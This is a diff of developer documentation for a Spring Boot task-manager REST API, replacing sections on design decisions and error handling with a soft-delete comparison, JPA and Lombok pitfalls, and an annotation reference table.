-**Response:** `200 OK` with the updated task.
-
-### DELETE /api/tasks/{id}
-Deletes a task.
-
-**Response:** `204 No Content` (empty body, success).
-
----
-
-## 12. Key Design Decisions Explained
-
-### Why is the entity field named `header` but the DB column is `title`?
-
-This is a deliberate teaching example showing that:
-1. The Java model (`header`) and database column (`title`) can have different names using `@Column(name = "title")`.
-2. The DTO field (`title`) can also differ from the entity field (`header`).
-3. The mapper (`@Mapping(source = "header", target = "title")`) bridges the gap.
-
-In practice, you'd usually keep names consistent, but this demonstrates that Spring + MapStruct handle the translation cleanly.
-
-### Why sanitize input in the Service, not the DTO or Controller?
-
-- **DTOs** are plain data holders. Business logic doesn't belong there.
-- **Controllers** handle HTTP concerns (routing, validation). Security is a business concern.
-- **Services** are the right place because: all writes go through the service; if you add another entry point (e.g., a message queue consumer), sanitization is already there.
-
-### Why use `@Transactional` on write operations?
-
-If `createTask` ran the duplicate check (read), then the insert (write), and the insert failed for some reason, you want the whole operation to be atomic. `@Transactional` ensures this. Without it, you could have partial state.
-
-### Why Boolean (not boolean) for the `completed` field in RequestDTO?
-
-With `boolean`, the JVM initializes it to `false` even if the client omits the field from JSON. That means:
-- Client sends `{ "title": "..." }` (no `completed` field)
-- Java sees `completed = false` — silently wrong
-- `@NotNull` has no effect on primitives
-
-With `Boolean` (wrapper):
-- Client sends `{ "title": "..." }` (no `completed` field)
-- Java sees `completed = null`
-- `@NotNull` triggers a 400 error — correct behavior
-
-### Why not use `@SpringBootTest` for all tests?
-
-`@SpringBootTest` starts a full Spring application context — which takes seconds. Mockito-based unit tests run in milliseconds. For a project with hundreds of tests, this time difference is significant. Use `@SpringBootTest` only when you need Spring to wire things together (e.g., testing MapStruct-generated code or integration flows).
-
----
-
-## 13. Common Errors and How They Are Handled
-
-| Scenario | What happens | HTTP response |
+| | Soft Delete (this project) | Hard Delete |
 |---|---|---|
-| `GET /api/tasks/999` (ID doesn't exist) | `TaskNotFoundException` thrown → caught by handler | `404 Not Found` |
-| `POST /api/tasks` with empty title | `@Valid` triggers `MethodArgumentNotValidException` | `400 Bad Request` |
-| `POST /api/tasks` with duplicate active title | `DuplicateTaskException` thrown | `409 Conflict` |
-| `POST /api/tasks` without `completed` field | `@Valid` → `@NotNull` fails | `400 Bad Request` |
-| `POST /api/tasks` with `<script>` in title | AntiSamy strips the tag before save | Script is removed, `200 OK` |
-| `POST /api/tasks` with title too long (>100 chars) | `@Size` triggers validation error | `400 Bad Request` |
-| Any unexpected error | Caught by the generic `Exception` handler | `500 Internal Server Error` (no internal details exposed) |
+| SQL | `UPDATE SET deleted=true` | `DELETE FROM` |
+| Recovery | ✅ Restore by setting `deleted=false` | ❌ Data is gone |
+| Audit trail | ✅ `deleted_at` timestamp preserved | ❌ No trace |
+| DB size | ⚠️ Grows over time (rows never removed) | ✅ Smaller |
+| Query complexity | ⚠️ Must filter `deleted=false` everywhere | ✅ Simpler |
+| Unique constraints | ⚠️ Soft-deleted title still blocks new ones | ✅ Natural |
+
+### 2. `@Getter/@Setter` vs `@Data` for JPA Entities
+
+`@Data` generates `equals()` and `hashCode()` that include all fields, including `id`. This breaks JPA because:
+- Before `save()`: `id = null` → hashCode = X
+- After `save()`: `id = 1` → hashCode = Y
+- Same object, different hashCode → breaks `Set` and `Map` collections
+
+`@Getter/@Setter` is safer for JPA entities.
+
+### 3. `Boolean` Wrapper vs `boolean` Primitive for Validation
+
+As explained in [Section 5](#5-dtos--request--response-separation), using the wrapper type `Boolean` allows `@NotNull` validation to distinguish between "client sent false" and "client didn't send the field at all".
+
+### 4. Field Name Mismatch (header ↔ title)
+
+This is an intentional teaching pattern. In real projects, you'll encounter legacy databases where the column name doesn't match the Java convention. The `@Column(name = "title")` and `@Mapping(source = "header", target = "title")` annotations show how to handle this cleanly.
+
+### 5. Sanitization in Service Layer (not DTO or Controller)
+
+| Location | Pros | Cons |
+|---|---|---|
+| Controller | Close to input | Mixes HTTP concerns with security |
+| DTO (constructor/setter) | Always applied | Breaks testability, hides side effects |
+| **Service (current)** | Clean separation, testable, single responsibility | Must remember to call it |
+| AOP/Interceptor | Automatic, DRY | Complex, hard to debug |
 
 ---
 
-*This document was generated on February 24, 2026, covering Spring Boot 4.0.3, Java 25.*
+## 20. Annotation Reference
+
+### Spring Framework
+
+| Annotation | Purpose |
+|---|---|
+| `@SpringBootApplication` | Combines `@Configuration` + `@EnableAutoConfiguration` + `@ComponentScan` |
+| `@RestController` | `@Controller` + `@ResponseBody` — every method returns JSON |
+| `@RequestMapping("/api/tasks")` | URL prefix for all methods in the class |
+| `@GetMapping` / `@PostMapping` / `@PutMapping` / `@DeleteMapping` | HTTP method handlers |
+| `@PathVariable` | Extracts `{id}` from URL: `/api/tasks/{id}` |
+| `@RequestParam` | Extracts query parameters: `?title=buy` |
+| `@RequestBody` | Deserialises JSON body → Java object |
+| `@Valid` | Triggers Bean Validation on the parameter |
+| `@PageableDefault` | Default pagination parameters |
+| `@Service` | Marks as a Spring-managed service bean |
+| `@Repository` | Marks as a Spring-managed repository bean |
+| `@Configuration` | Marks as a Spring configuration class |
+| `@Bean` | Declares a method that returns a Spring-managed bean |
+| `@Transactional` | Wraps method in a database transaction |
+| `@RestControllerAdvice` | Global exception handler for all controllers |
+| `@ExceptionHandler` | Catches specific exception types |
+| `@RequiredArgsConstructor` | Lombok: constructor for all `final` fields (enables DI) |
+
+### JPA / Hibernate
+
+| Annotation | Purpose |
+|---|---|
+| `@Entity` | Maps class to a database table |
+| `@Table(name = "tasks")` | Explicit table name |
+| `@Id` | Primary key field |
+| `@GeneratedValue(strategy = IDENTITY)` | Auto-increment (PostgreSQL BIGSERIAL) |
+| `@Column(name, nullable, unique, length)` | Column mapping and constraints |
+| `@SQLDelete(sql = "...")` | Overrides DELETE with custom SQL (soft delete) |
+| `@SQLRestriction("deleted = false")` | Auto-appends WHERE clause to all queries |
+| `@EntityListeners(AuditingEntityListener.class)` | Enables JPA auditing lifecycle events |
+| `@CreatedDate` | Auto-filled on insert |
+| `@LastModifiedDate` | Auto-filled on every save |
+| `@EnableJpaAuditing` | Activates auditing globally |
+
+### Lombok
+
+| Annotation | Generates |
+|---|---|
+| `@Getter` / `@Setter` | Getter and setter methods for all fields |
+| `@NoArgsConstructor` | Empty constructor |
+| `@AllArgsConstructor` | Constructor with all fields |
+| `@Builder` | Fluent builder: `Task.builder().header("x").build()` |
+| `@Builder.Default` | Uses field initialiser as builder default |
+| `@Data` | `@Getter` + `@Setter` + `@ToString` + `@EqualsAndHashCode` |
+| `@RequiredArgsConstructor` | Constructor for `final` fields only |
+
+### Jakarta Validation
+
+| Annotation | Purpose |
+|---|---|
+| `@NotBlank` | Not null, not empty, not whitespace only |
+| `@NotNull` | Not null (but can be empty) |
+| `@Size(min, max)` | String length constraint |
+
+### MapStruct
+
+| Annotation | Purpose |
+|---|---|
+| `@Mapper(componentModel = "spring")` | Generates a Spring `@Component` |
+| `@Mapping(source, target)` | Map differently-named fields |
+| `@Mapping(target, expression)` | Compute a field via Java expression |
+| `@Mapping(target, ignore)` | Skip mapping this field |
+
+---
+
+*This document was generated from the actual source code of the TaskManagerApplication project.*
 
